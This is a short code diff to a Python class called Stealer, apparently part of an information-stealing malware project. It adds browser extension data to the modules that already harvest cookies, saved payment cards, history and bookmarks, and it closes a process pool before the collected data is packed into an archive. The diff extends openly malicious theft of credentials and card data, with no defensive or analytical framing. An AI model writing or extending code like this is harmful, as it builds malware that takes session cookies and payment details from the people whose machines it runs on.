@@ -28,7 +28,8 @@ class Stealer(Thread):
             Features.cookies,
             Features.cards,
             Features.history,
-            Features.bookmarks
+            Features.bookmarks,
+            Features.extensions
         ] if module in features or Features.all in features]
         browser_statuses = True if len(browser_functions) > 0 else False
 
@@ -170,6 +171,8 @@ class Stealer(Thread):
                 pool.map(functions.run_process, [
                     method["object"] for method in self.__methods if method["status"] is True
                 ])
+
+            pool.close()
 
             self.__create_archive()
 
